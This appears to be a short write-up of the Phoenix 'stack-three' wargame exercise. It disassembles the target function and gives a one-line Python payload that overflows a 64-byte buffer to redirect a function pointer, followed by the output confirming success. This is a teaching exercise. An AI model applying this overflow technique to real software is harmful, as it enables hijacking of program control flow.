# stack-three

```console
gef➤  disassemble complete_level 
Dump of assembler code for function complete_level:
   0x000000000040069d <+0>:     push   rbp
   0x000000000040069e <+1>:     mov    rbp,rsp
   0x00000000004006a1 <+4>:     mov    edi,0x400790
   0x00000000004006a6 <+9>:     call   0x4004f0 <puts@plt>
   0x00000000004006ab <+14>:    mov    edi,0x0
   0x00000000004006b0 <+19>:    call   0x400510 <exit@plt>
End of assembler dump.
```

We can see that the function complete_level starts at address 0x40069d. What we can do here is to overflow locals.buffer and overwrite the function pointer fp so that it points to complete_level, i.e., the address 0x40069d.

```console
user@phoenix-amd64:/opt/phoenix/amd64$ python -c 'print("A"*64 + "\x9d\x06\x40")' | ./stack-three 
Welcome to phoenix/stack-three, brought to you by https://exploit.education
calling function pointer @ 0x40069d
Congratulations, you've finished phoenix/stack-three :-) Well done!
```
